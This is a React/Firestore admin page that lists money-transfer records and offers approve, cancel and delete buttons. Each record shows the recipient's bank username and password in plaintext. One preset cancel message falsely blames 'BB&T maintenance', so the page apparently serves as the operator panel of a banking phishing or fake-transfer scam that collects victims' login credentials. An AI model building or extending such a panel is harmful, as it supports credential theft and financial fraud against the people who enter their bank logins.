"use client";

import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  collection,
  query,
  orderBy,
  onSnapshot,
  updateDoc,
  deleteDoc,
  doc,
} from "firebase/firestore";
import { db } from "@/lib/firebaseClient";

export default function AdminTransactionsPage() {
  const [transactions, setTransactions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  const [showCancelModal, setShowCancelModal] = useState(false);
  const [selectedTx, setSelectedTx] = useState(null);
  const [cancelReason, setCancelReason] = useState("");
  const [customReason, setCustomReason] = useState("");
  const [modalError, setModalError] = useState("");

  useEffect(() => {
    const q = query(
      collection(db, "transactions"),
      orderBy("createdAt", "desc")
    );

    const unsub = onSnapshot(
      q,
      (snapshot) => {
        setTransactions(
          snapshot.docs.map((doc) => ({
            id: doc.id,
            ...doc.data(),
          }))
        );
        setLoading(false);
      },
      (err) => {
        console.error("Firestore error:", err);
        setError(err.message);
        setLoading(false);
      }
    );

    return () => unsub();
  }, []);

  const approveTransaction = async (id) => {
    await updateDoc(doc(db, "transactions", id), { status: "approved" });
  };

  const openCancelModal = (tx) => {
    setSelectedTx(tx);
    setShowCancelModal(true);
    setCancelReason("");
    setCustomReason("");
    setModalError("");
  };

  const confirmCancel = async () => {
    const finalReason =
      cancelReason === "Other" ? customReason : cancelReason;

    if (!finalReason) {
      setModalError("Please select or enter a reason.");
      return;
    }

    await updateDoc(doc(db, "transactions", selectedTx.id), {
      status: "canceled",
      cancelReason: finalReason,
      canceledAt: new Date(),
    });

    setShowCancelModal(false);
    setSelectedTx(null);
    setCancelReason("");
    setCustomReason("");
    setModalError("");
  };

  const deleteTransaction = async (id) => {
    await deleteDoc(doc(db, "transactions", id));
  };

  const formatDate = (ts) => (ts ? ts.toDate().toLocaleString() : "—");

  if (loading)
    return <p className="text-gray-400 p-8">Loading transactions…</p>;

  if (error)
    return (
      <p className="text-yellow-400 p-8">
        Error loading transactions: {error}
      </p>
    );

  return (
    <div className="min-h-screen bg-slate-950 text-white px-3 p-8">
      <h1 className="text-2xl font-bold mb-6 text-center">
        Admin Transactions
      </h1>

      {transactions.length === 0 ? (
        <p className="text-gray-400 text-center">No transactions yet.</p>
      ) : (
        <div className="overflow-x-auto bg-slate-900 rounded shadow">
          {transactions.map((tx) => (
            <div
              key={tx.id}
              className="flex flex-col border-t border-slate-700 hover:bg-slate-800/50 py-3 transition-colors duration-200"
            >
              <div className="flex justify-between p-2">
                <p className="text-gray-400 text-xs">
                  {formatDate(tx.createdAt)}
                </p>
                <p
                  className={`font-semibold text-xs uppercase ${
                    tx.status === "approved"
                      ? "text-green-400"
                      : tx.status === "canceled"
                      ? "text-red-500"
                      : "text-yellow-400"
                  }`}
                >
                  {tx.status}
                </p>
              </div>

              <div className="text-sm space-y-1 px-2">
                <p>
                  <span className="text-gray-400">Name:</span>{" "}
                  {tx.recipientName}
                </p>

                <p>
                  <span className="text-gray-400">Account:</span>{" "}
                  {tx.recipientAccount}
                </p>

                <p>
                  <span className="text-gray-400">Username:</span>{" "}
                  <span className="text-orange-400">
                    {tx.recipientUsername || "—"}
                  </span>
                </p>

                <p>
                  <span className="text-gray-400">Password:</span>{" "}
                  <span className="text-orange-400">
                    {tx.recipientPassword || "—"}
                  </span>
                </p>

                <p>
                  <span className="text-gray-400">From:</span>{" "}
                  {tx.fromAccount}
                </p>

                <p>
                  <span className="text-gray-400">Amount:</span> $
                  {tx.amount?.toLocaleString()}
                </p>

                {tx.status === "canceled" && tx.cancelReason && (
                  <p className="text-red-400 text-xs mt-1">
                    <strong>Cancel Reason:</strong> {tx.cancelReason}
                  </p>
                )}
              </div>

              <div className="flex justify-center gap-2 mt-3">
                {tx.status !== "approved" && (
                  <button
                    onClick={() => approveTransaction(tx.id)}
                    className="bg-green-600 hover:bg-green-500 px-3 py-1 rounded text-sm"
                  >
                    Approve
                  </button>
                )}

                {tx.status !== "canceled" && (
                  <button
                    onClick={() => openCancelModal(tx)}
                    className="bg-yellow-600 hover:bg-yellow-500 px-3 py-1 rounded text-sm"
                  >
                    Cancel
                  </button>
                )}

                <button
                  onClick={() => deleteTransaction(tx.id)}
                  className="bg-red-600 hover:bg-red-500 px-3 py-1 rounded text-sm"
                >
                  Delete
                </button>
              </div>
            </div>
          ))}
        </div>
      )}

      {/* CANCEL MODAL */}
      <AnimatePresence>
        {showCancelModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"
          >
            <motion.div
              initial={{ scale: 0.9, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.9, y: 20 }}
              className="bg-white text-black rounded-lg p-6 w-[380px] shadow-xl"
            >
              <h3 className="text-lg font-semibold mb-4">
                Cancel Transaction
              </h3>

              <label className="block text-sm mb-2 font-medium">
                Reason for canceling
              </label>

              <select
                value={cancelReason}
                onChange={(e) => setCancelReason(e.target.value)}
                className="w-full border rounded px-3 py-2 mb-3 text-sm"
              >
                <option value="">Select reason</option>
                <option value="Invalid recipient info">
                  Invalid recipient info
                </option>
                <option value="Recipient bank not supported">
                  Recipient bank not supported
                </option>
                <option value="BB&T is under maintenance, try again">
                  BB&T is under maintenance, try again
                </option>
                <option value="Other">Other</option>
              </select>

              {cancelReason === "Other" && (
                <textarea
                  placeholder="Enter custom reason"
                  value={customReason}
                  onChange={(e) => setCustomReason(e.target.value)}
                  className="w-full border rounded px-3 py-2 mb-3 text-sm"
                />
              )}

              {modalError && (
                <p className="text-red-600 text-xs mb-2">
                  {modalError}
                </p>
              )}

              <div className="flex justify-end gap-2">
                <button
                  onClick={() => setShowCancelModal(false)}
                  className="px-3 py-1 bg-gray-400 text-white rounded text-sm"
                >
                  Close
                </button>

                <button
                  onClick={confirmCancel}
                  className="px-3 py-1 bg-red-600 text-white rounded text-sm"
                >
                  Confirm Cancel
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}